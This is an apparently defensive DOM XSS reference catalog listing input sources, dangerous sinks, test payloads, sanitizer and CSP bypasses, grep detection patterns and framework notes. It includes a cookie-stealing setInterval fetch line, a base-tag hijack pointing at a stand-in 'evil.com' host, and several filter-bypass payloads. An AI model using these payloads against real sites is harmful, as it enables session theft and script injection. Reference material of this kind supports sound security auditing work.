# DOM XSS Reference Catalog

> **Search shortcuts:** `grep "^## Sources"` | `grep "^## Sinks"` | `grep "^## Payloads"` | `grep "^## Detection"`

---

## Table of Contents
- [Sources](#sources) — User-controllable input patterns (12 patterns)
- [Sinks](#sinks) — Execution sinks by severity (execution, HTML, URL, style)
- [Payloads](#payloads) — Test payloads organized by sink category
- [Bypass Techniques](#bypass-techniques) — Sanitizer, CSP, and filter bypasses
- [Detection Heuristics](#detection-heuristics) — Multi-step chain detection
- [Scanners & Commands](#scanners--commands) — semgrep / jsluice / AST scanner invocations
- [Multi-Step Chains](#multi-step-chains) — cross-class chains that feed a DOM XSS sink
- [False Positives](#false-positives) — What looks like DOM XSS but isn't
- [Framework Notes](#framework-notes) — React, Angular, Vue, jQuery specifics

---

## Sources

User-controllable input that can reach DOM sinks:

| Source | Pattern | Example |
|--------|---------|---------|
| `location` | `location.href`, `location.search`, `location.hash`, `location.pathname` | `const q = location.search.split('=')[1]` |
| `URLSearchParams` | `new URLSearchParams(location.search).get('q')` | `params.get('redirect')` |
| `document.URL` | `document.URL`, `document.documentURI` | `const u = document.URL` |
| `document.referrer` | `document.referrer` | `const ref = document.referrer` |
| `window.name` | `window.name` (cross-domain persistent) | `const data = window.name` |
| `postMessage` | `event.data`, `MessageEvent.data` | `window.addEventListener('message', e => process(e.data))` |
| `localStorage` | `localStorage.getItem()`, `sessionStorage.getItem()` | `const theme = localStorage.getItem('theme')` |
| `document.cookie` | `document.cookie` | `const prefs = parseCookie(document.cookie)` |
| `history` | `history.pushState()`, `history.replaceState()` | `history.pushState({}, '', '?x=' + userInput)` |
| `WebSocket` | `ws.onmessage` → `event.data` | `ws.onmessage = e => render(e.data)` |
| `hashchange` | `window.onhashchange` → `location.hash` | `window.onhashchange = () => load(location.hash.slice(1))` |
| IndexedDB | `db.transaction().objectStore().get()` | `const cached = await getFromDB('userInput')` |

---

## Sinks

### Execution Sinks (Critical)

| Sink | Pattern | Payload Example |
|------|---------|-----------------|
| `eval()` | `eval(userInput)` | `eval(location.hash.slice(1))` |
| `Function()` | `new Function(userInput)` | `new Function('return ' + userInput)()` |
| `setTimeout()` | `setTimeout(userInput, 0)` | `setTimeout(location.search.split('=')[1], 100)` |
| `setInterval()` | `setInterval(userInput, 1000)` | `setInterval('fetch("/xss?"+document.cookie)', 1000)` |
| `execScript()` | IE-only: `window.execScript(userInput)` | `execScript(payload)` |

### HTML Sinks (High)

| Sink | Pattern | Notes |
|------|---------|-------|
| `innerHTML` | `el.innerHTML = userInput` | Most common DOM XSS vector |
| `outerHTML` | `el.outerHTML = userInput` | Replaces entire element |
| `insertAdjacentHTML` | `el.insertAdjacentHTML('beforeend', userInput)` | No sanitization |
| `document.write()` | `document.write(userInput)` | Synchronous; blocks parser |
| `document.writeln()` | `document.writeln(userInput)` | Same as write() |

### URL Sinks (Medium)

| Sink | Pattern | Notes |
|------|---------|-------|
| `location` | `location = userInput` | Full navigation |
| `location.href` | `location.href = userInput` | `javascript:` protocol |
| `location.replace()` | `location.replace(userInput)` | `javascript:` protocol |
| `location.assign()` | `location.assign(userInput)` | `javascript:` protocol |
| `window.open()` | `window.open(userInput)` | `javascript:` protocol |

### Style Sinks (Low-Medium)

| Sink | Pattern | Payload |
|------|---------|---------|
| CSS `url()` | `el.style.background = userInput` | `url("javascript:alert(1)")` |
| `@import` | `<style>@import url("${userInput}")</style>` | CSS injection + data exfil |

### jQuery Sinks (Framework-specific)

| Sink | Pattern | jQuery Version |
|------|---------|----------------|
| `html()` | `$el.html(userInput)` | All versions |
| `append()` / `prepend()` | `$el.append(userInput)` | All versions |
| `after()` / `before()` | `$el.after(userInput)` | All versions |
| `replaceWith()` | `$el.replaceWith(userInput)` | All versions |
| `wrap()` / `wrapAll()` | `$el.wrap(userInput)` | All versions |

---

## Payloads

### Basic Probes
```javascript
// Image onerror (no quotes needed)
<img src=x onerror=alert(1)>

// SVG onload (bypasses some filters)
<svg onload=alert(1)>

// Body onload  
<body onload=alert(1)>

// Input autofocus
<input autofocus onfocus=alert(1)>
```

### innerHTML Bypasses
```javascript
// No event handler needed
<iframe srcdoc="<script>alert(1)</script>">

// Template element execution
<template><script>alert(1)</script></template>

// MathML namespace injection
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
```

### AngularJS-Specific
```javascript
// Template injection via innerHTML
<div ng-app>{{constructor.constructor('alert(1)')()}}</div>

// $sanitize bypass (Angular < 1.6)
<a href="javascript:alert(1)">click</a>
```

### CSP Bypasses
```javascript
// JSONP endpoint abuse
<script src="/api/jsonp?callback=alert(1)"></script>

// AngularJS CSP bypass
<div ng-app ng-csp><div ng-click=$event.view.alert(1)>click</div></div>

// Trusted Types bypass (if policy exists)
trustedTypes.createPolicy('default', {createHTML: x => x})
```

---

## Bypass Techniques

### Sanitizer Bypasses
| Technique | Pattern | Example |
|-----------|---------|---------|
| Double encoding | `&amp;lt;` → sanitized → `&lt;` → browser decodes to `<` | Works with incorrect decode order |
| Mutation XSS | `<noscript><p title="</noscript><img src=x onerror=alert(1)>">` | Parser confusion |
| Namespace confusion | `<svg><math><title><img src=x onerror=alert(1)>` | SVG/MathML parsing differences |
| DOM clobbering | `<form id=focus><input name=href value=javascript:alert(1)>` | Override DOM properties |
| Script gadget | `<!--><script>alert(1)</script>-->` inside SVG | Comment + namespace trick |

### CSP Bypasses
| CSP Directive | Bypass |
|---------------|--------|
| `script-src 'self'` | JSONP endpoints on same origin; AngularJS `$event.view.alert(1)` |
| `script-src 'nonce-...'` | DOM XSS inserts into existing nonced script tag |
| `script-src 'strict-dynamic'` | Requires existing script loader; chained trust |
| Missing `base-uri` | `<base href="//evil.com/">` — hijack relative script loads |
| Missing `object-src` | `<object data="data:text/html,<script>alert(1)</script>">` |

---

## Detection Heuristics

### Multi-Step Chain Detection
1. **Source identification:** Find `location.*`, `URLSearchParams`, `postMessage`, `window.name` assignments
2. **Data flow:** Trace variable through sanitizers, transforms, and string operations
3. **Sink identification:** Find `innerHTML`, `eval()`, `document.write()`, `location` assignments
4. **Sanitizer bypass check:** If sanitizer present, check for bypass techniques
5. **CSP check:** If CSP present, check for bypass vectors

### Grep Patterns for Manual Triage
```bash
# Sources
grep -nE 'location\.(href|search|hash|pathname)\b|URLSearchParams|document\.referrer|window\.name|postMessage|event\.data|localStorage\.get|document\.cookie' file.js

# Sinks  
grep -nE '\.innerHTML\s*=|\.outerHTML\s*=|insertAdjacentHTML|document\.write|eval\(|new Function\(|setTimeout\s*\([^,)]+\)|setInterval\s*\([^,)]+\)' file.js

# jQuery sinks
grep -nE '\$\(.*\)\.(html|append|prepend|after|before|replaceWith|wrap)\(' file.js
```

---

## Scanners & Commands

```bash
# semgrep — DOM XSS rulesets
semgrep --config p/xss --config p/javascript --config p/owasp-top-ten --json {file}

# jsluice — extract dynamic endpoints / URLs from JS
jsluice urls < {file}

# AST-level source→sink trace
python3 scripts/analyzers/dom_xss.py --file {file}
```

---

## Multi-Step Chains

Cross-class flows where another bug supplies the DOM XSS source:

| Chain | What to check |
|-------|---------------|
| Prototype pollution → DOM XSS | `Object.prototype` / `__proto__` polluted before the sink (e.g. jQuery `$('<div/>')` gadget) |
| DOM clobbering → DOM XSS | Global/config variable checks bypassed via named HTML elements (`<form id=...>`, `name=`) |
| postMessage → DOM XSS | `event.data` reaches a sink without `event.origin` validation |

---

## False Positives

| Pattern | Why FP | Verification |
|---------|--------|-------------|
| `el.innerHTML = "<b>" + escapeHtml(userInput) + "</b>"` | Proper HTML escaping | Check for `escapeHtml`, `textContent` usage |
| `el.innerHTML = trustedHtml` where `trustedHtml` comes from `trustedTypes` policy | Trusted Types enforced | Check for `trustedTypes.createPolicy` |
| `location.href = "/app/" + encodeURIComponent(userInput)` | `encodeURIComponent` prevents protocol injection | Verify URL encoding |
| React's `dangerouslySetInnerHTML` with sanitized input | DOMPurify/marked sanitized | Check sanitizer presence |
| `setTimeout("callback()", 100)` — static string, not user input | No user data flow | Verify source isn't user-controlled |
| `<img src=x onerror=...>` in server-side template literals (SSR) | Server-rendered, not DOM XSS | Check if code runs client-side |

---

## Framework Notes

### React
- `dangerouslySetInnerHTML` is the primary vector — check for `__html` prop
- React escapes JSX `{}` by default — DOM XSS requires explicit `dangerouslySetInnerHTML`
- `ref` callbacks that use `innerHTML` are suspicious
- `ReactDOM.render()` with user-controlled markup in string form

### Angular
- `bypassSecurityTrustHtml()` and `bypassSecurityTrustScript()` are red flags
- Template expressions `{{ }}` are sanitized by default — DOM XSS needs explicit bypass
- `[innerHTML]="userInput"` bypasses sanitization
- AngularJS (< 2.0): `$sce.trustAsHtml()`, `ng-bind-html`, `$sanitize` bypass

### Vue
- `v-html="userInput"` is the primary vector
- `v-bind:style` with `url()` can execute JS in old browsers
- Template interpolation `{{ }}` auto-escapes — `v-html` is the only bypass
- `this.$refs.el.innerHTML = userInput` in component methods

### jQuery
- `html()` is unsafe in ALL versions — prefers `text()` for user data
- `append()`, `prepend()`, `after()`, `before()` pass through HTML parser
- jQuery < 1.9: `$('<div class=' + userInput + '>')` — selector injection
- `$.parseHTML()` does some sanitization but NOT for `<script>` inside complex markup
